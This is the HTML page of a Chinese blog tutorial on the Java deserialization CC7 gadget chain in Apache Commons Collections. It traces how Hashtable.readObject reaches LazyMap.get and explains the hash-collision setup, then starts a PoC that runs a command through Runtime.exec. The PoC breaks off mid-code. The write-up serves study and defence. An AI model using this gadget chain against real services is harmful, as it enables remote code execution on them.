@@ -1,0 +1,1076 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      JAVA反序列化——CC7链及CC链总结 | Infernity&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="" />
+  <meta name="description" content="blog" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/I.png">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 59,
+      randomYouSrc: '/img/background/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: true,
+	  appId: 'AU8',
+	  appKey: '4cU',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「JAVA反序列化——CC7链及CC链总结」
+		
+	</p>
+
+	
+	
+		<span id="star-button" rel="unlike">
+			<i class="icon-heart"></i>
+		</span>
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-Friends!">
+			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/qq.png" target="_blank">
+				<span class="icon-qq"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/img/weixin.jpg" target="_blank">
+				<span class="icon-weixin"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
+				<span class="icon-csdn"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-instagram"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<span class="icon-twitter"></span>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<span class="icon-rss"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/" itemprop="url">
+		JAVA反序列化——CC7链及CC链总结
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/" itemprop="url">
+		<time datetime="2024-04-18T10:21:46.000Z" itemprop="dateUpdated">
+	  		2024-06-18
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/JAVA/" class=" ">
+			JAVA
+		</a>
+	
+		
+			</span>
+			
+			
+
+	
+    <span class="leancloud_visitors" id="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/_visitors" data-url="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/" data-title="JAVA反序列化——CC7链及CC链总结">
+       	<i class="icon-eye"></i>
+       	热度
+        
+            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
+                   
+    </span>
+    
+
+
+
+	
+    <span class="leancloud_likes" id="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/_likes" data-url="/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/" data-title="JAVA反序列化——CC7链及CC链总结" rel="unlike">
+        <i class="icon-heart"></i>
+        喜欢
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+	
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<p>跟CC5一样，也是利用CC1的LazyMap.get及之后的部分，也是只改了开头。</p>
+<p>这次是利用Hashtable.readObject方法，这个类是可以序列化的。</p>
+<h1 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h1><p>在AbstractMap类里的equals方法调用了get方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    …………</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))   <span class="comment">//调用get</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">…………</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在Hashtable类的reconstitutionPut方法调用了equals方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException&#123;</span><br><span class="line">      …………</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;      <span class="comment">//调用equals</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">…………</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在本类的readObject调用了reconstitutionPut方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        …………</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>看一下equals方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">//判断1是否为同一对象</span></span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//判断2运行类型是否不是Map</span></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">//向上转型</span></span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="comment">//判断HashMap的元素的个数size</span></span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取HashMap的迭代器</span></span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            <span class="comment">//获取每个元素（Node）</span></span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="comment">//获取key和value</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="comment">//判断3如果value为null，则判断key</span></span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果value不为null，判断value内容是否相同</span></span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它进行了三个判断：</p>
+<blockquote>
+<ol>
+<li>判断是否为同一对象</li>
+<li>判断对象的运行类型</li>
+<li>判断Map中元素的个数</li>
+</ol>
+</blockquote>
+<p>当以上三个判断都不满足的情况下，则进一步判断Map中的元素，也就是判断元素的key和value的内容是否相同，在value不为null的情况下，m会调用get方法获取key的内容，虽然对象o向上转型成Map类型，但是m对象本质上是一个LazyMap。因此m对象调用get方法时实际上是调用了LazyMap的get方法。</p>
+<p>看看Hashtable的readObject方法，这个方法没什么需要注意的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取table数组的容量</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="comment">//读取table数组的元素个数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算table数组的length</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        length--;</span><br><span class="line">    <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">        length = origlength;</span><br><span class="line">    <span class="comment">//根据length创建table数组</span></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化，还原table数组</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们再来看看reconstitutionPut方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException &#123;</span><br><span class="line">	<span class="comment">//value不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重新计算key的hash值</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">	<span class="comment">//根据hash值计算存储索引</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">	<span class="comment">//判断元素的key是否重复</span></span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">		<span class="comment">//如果key重复则抛出异常</span></span><br><span class="line">           <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//key不重复则将元素添加到table数组中</span></span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">           Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">       tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">       count++;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>reconstitutionPut方法首先对value进行不为null的校验，否则抛出反序列化异常，然后根据key计算出元素在table数组中的存储索引，判断元素在table数组中是否重复，如果重复则抛出异常，如果不重复则将元素转换成Entry并添加到tabl数组中。</p>
+<p>CC7利用链的漏洞触发的关键就在reconstitutionPut方法中，该方法在判断重复元素的时候校验了两个元素的hash值是否一样，然后接着key会调用equals方法判断key是否重复时就会触发漏洞。</p>
+<blockquote>
+<p>需要注意的是，在添加第一个元素时并不会进入if语句调用equals方法进行判断，因此Hashtable中的元素至少为2个并且元素的hash值也必须相同的情况下才会调用equals方法，否则不会触发漏洞。</p>
+</blockquote>
+<hr style="border: 1px solid black;"/>
+
+<p>所以我们这里至少需要两个map：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">LazyMap1.put(<span class="string">&quot;aa&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">LazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">LazyMap2.put(<span class="string">&quot;bb&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(LazyMap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(LazyMap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。"><a href="#前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。" class="headerlink" title="前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。"></a>前面我们说过触发漏洞还有一个前提：两个元素的hash值必须相同。</h4><p>在反序列化时，reconstitutionPut方法中的if判断中两个元素的hash值必须相同的情况下，才会调用eauals方法。这也是为什么我们在构造利用链的时候必须添加两个两个元素，虽然这两个元素的hash值是一样的，但本质上是两个不同的元素。</p>
+<p>可以打印出两个元素的hash：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(LazyMap1.hashCode());</span><br><span class="line">System.out.println(LazyMap2.hashCode());</span><br></pre></td></tr></table></figure>
+
+<p>这里给出两组hash相同的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yy与zZ</span><br><span class="line">Ea与FB</span><br></pre></td></tr></table></figure>
+
+<h4 id="关于lazyMap2集合中的第二个元素（yy-yy）从何而来"><a href="#关于lazyMap2集合中的第二个元素（yy-yy）从何而来" class="headerlink" title="关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来"></a>关于lazyMap2集合中的第二个元素（yy&#x3D;yy）从何而来</h4><p>Hashtable在添加第二个元素时，lazyMap2集合会“莫名其妙”添加一个元素yy，后面仔细跟踪了Hashtable添加元素的过程才发现，Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法put一个元素yy：</p>
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192255444.png" alt="image-20240418192255444"></p>
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192306401.png" alt="image-20240418192306401"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashtable.put(LazyMap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这句代码执行完毕后，LazyMap2里就有了两个元素，zZ和yy。</p>
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192412105.png" alt="image-20240418192412105"></p>
+<p>当在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，那么也就不会触发漏洞。</p>
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/20210823095600172.png" alt="20210823095600172"></p>
+<p>因此在构造CC7利用链的payload代码时，Hashtable在添加第二个元素后，lazyMap2需要调用remove方法删除元素yy才能触发漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/image-20240418192449262.png" alt="image-20240418192449262"></p>
+<h1 id="完整CC7链："><a href="#完整CC7链：" class="headerlink" title="完整CC7链："></a>完整CC7链：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化InvokerTransformer，反射调用exec函数执行命令。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span 